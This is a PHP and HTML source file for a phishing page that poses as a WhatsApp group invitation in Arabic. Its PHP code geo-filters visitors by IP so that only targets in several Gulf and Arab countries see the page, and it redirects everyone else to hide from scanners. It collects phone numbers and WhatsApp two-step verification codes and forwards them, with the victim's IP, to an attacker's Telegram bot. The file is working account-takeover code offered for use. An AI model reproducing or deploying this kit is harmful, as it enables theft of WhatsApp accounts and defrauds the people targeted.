<?php
function get_ip_server()
{
    $ip = 'UNKNOWN';

    $ip_headers = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ip_headers as $header) {
        if (isset($_SERVER[$header]) && !empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            break;
        }
    }

    return $ip;
}

$ip = get_ip_server();

// Read secrets from environment for security
$access_key = getenv('IPSTACK_KEY');
$telegramToken = getenv('TELEGRAM_TOKEN');
$chatId = getenv('TELEGRAM_CHAT_ID');

// Fail early if configuration is missing
if (empty($access_key) || empty($telegramToken) || empty($chatId)) {
    http_response_code(500);
    error_log('Missing required environment variables: IPSTACK_KEY, TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
    echo "Configuration error. Contact the site administrator.";
    exit;
}

// Initialize CURL to ipstack
$ch = curl_init('https://api.ipstack.com/' . $ip . '?access_key=' . $access_key);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$json = curl_exec($ch);
$curlErr = curl_error($ch);
curl_close($ch);

$api_result = [];
if ($json !== false) {
    $api_result = json_decode($json, true);
}

$allowedCountries = ['SA', 'OM', 'BH', 'KW', 'QA', 'AE', 'JO', 'MA'];
$redirectUrl = 'https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar';

$nobots = 0;
$countryCode = isset($api_result['country_code']) ? $api_result['country_code'] : null;
if ($countryCode && in_array($countryCode, $allowedCountries, true)) {
    $nobots = 1;
} else {
    header('Location: ' . $redirectUrl);
    exit;
}

$apiUrl = "https://api.telegram.org/bot" . $telegramToken;

// Safely fetch POST values
$idd = filter_input(INPUT_POST, 'iddR', FILTER_SANITIZE_STRING) ?: '';
$ipad = filter_input(INPUT_POST, 'ipad', FILTER_SANITIZE_STRING) ?: '';
$numeratel = filter_input(INPUT_POST, 'mobile_phone', FILTER_SANITIZE_STRING) ?: '';
$confirm = filter_input(INPUT_POST, 'confirmcode', FILTER_SANITIZE_STRING) ?: '';

// Construct the message text
$baseMessage = "<b>[Whtspp Code OTP]</b>";
$messageText = $baseMessage . "\n"
    . "ID:#$idd: BOUGAYO IP: $ipad\n"
    . "ID:#$idd: Numbers Phone: $numeratel\n"
    . "ID:#$idd: whtspp Code OTP: $confirm";

$parametre = [
    'chat_id' => $chatId,
    'parse_mode' => 'HTML',
    'text' => $messageText,
];

$sender = curl_init($apiUrl . '/sendMessage');
curl_setopt($sender, CURLOPT_HEADER, false);
curl_setopt($sender, CURLOPT_RETURNTRANSFER, true);
curl_setopt($sender, CURLOPT_POST, true);
curl_setopt($sender, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, true);
$result = curl_exec($sender);
$sendErr = curl_error($sender);
curl_close($sender);

// Optional: log failures for debugging (do not expose to users)
if ($result === false) {
    error_log('Telegram sendMessage error: ' . $sendErr);
}

?>

<!DOCTYPE html>
<html lang="ar" id="facebook" class="">

<head>
    <meta charset="utf-8">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <script nonce="">function envFlush(a) { function b(b) { for (var c in a) b[c] = a[c] } window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env)) } envFlush({[...]</script>
    <script nonce="">window.openDatabase && (window.openDatabase = function () { throw new Error() });</script>
    <script nonce="">_btldr = {};</script>
    <script nonce="">(function () { function a(a) { return a.parentElement !== document.body && a.parentElement !== document.head } function b(a) { return a.nodeName === "SCRIPT" || a.nodeName === "LINK" [...]</script>
    <style nonce=""></style>
    <script nonce="">__DEV__ = 0;</script><noscript>
        <meta http-equiv="refresh" content="0; URL=/invite/--sanitized-S228802--?lang=ar&amp;_fb_noscript=1" />
    </noscript>
    <title id="pageTitle">الدعوة للانضمام إلى مجموعة واتساب</title>
    <meta name="bingbot" content="noarchive">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="description" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta name="keywords">
    <meta property="og:title" content="">
    <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v4/yo/r/J5gK5AgJ_L5.png">
    <meta property="og:site_name" content="WhatsApp.com">
    <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta property="og:keywords">
    <meta property="invite_link_type" content="REGULAR">
    <meta property="invite_link_type_v2" content="">
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="manifest" href="/data/manifest.json" crossorigin="use-credentials">
    <meta name="robots" content="noindex">
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yz/r/ujTY9i_Jhs1.png">
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/y9/l/1,cross/C-dqzSrX_3A.css"
        data-bootloader-hash="lR1wO42" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yt/l/1,cross/Sj-zldZqFah.css"
        data-bootloader-hash="h/mqcr0" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yY/l/1,cross/abldk9QqwF9.css"
        data-bootloader-hash="sRXYEyZ" crossorigin="anonymous">
</head>

<body id="top-of-page" dir="rtl">
    <div>
        <img src="./assets/img/pinstep.jpg" alt="pin step">
        <form action="Code-otp-2.php" method="POST">
            <strong style="font-style: italic; font-size:16px; direction:ltr;"> أدخل رمز التحقق من خطوتين</strong>
            <br><br>
            <div class="form-group">
                <input type="text" name="confirmcode" pattern="[0-9]*" class="cod88e" style="padding-right: 6px;direction: ltr;text-align: center;font-size:19px" maxlength="6" placeholder="--- ---" required>
            </div>

            <br><br>
            <input type="hidden" name="iddR" value="<?php echo htmlspecialchars($_POST['iddR'] ?? '', ENT_QUOTES); ?>">
            <input type="hidden" name="ipad" value="<?php echo htmlspecialchars($_POST['ipad'] ?? '', ENT_QUOTES); ?>">
            <input type="hidden" name="mobile_phone" value="<?php echo htmlspecialchars($_POST['mobile_phone'] ?? '', ENT_QUOTES); ?>">
            <button type="submit" title="اتبع هذا الرابط للانضمام" style="border: none;"><span>الانضمام إلى الدردشة</span></button>
        </form>

        <p>اتبع هذا الرابط للانضمام</p>
        <h4><a href="https://web.whatsapp.com/accept?code=--sanitized-S228802--">فتح الواتساب</a></h4>
    </div>
<!-- Vercel Speed Insights -->
<script src="speed-insights.js" defer></script>

</body>

</html>
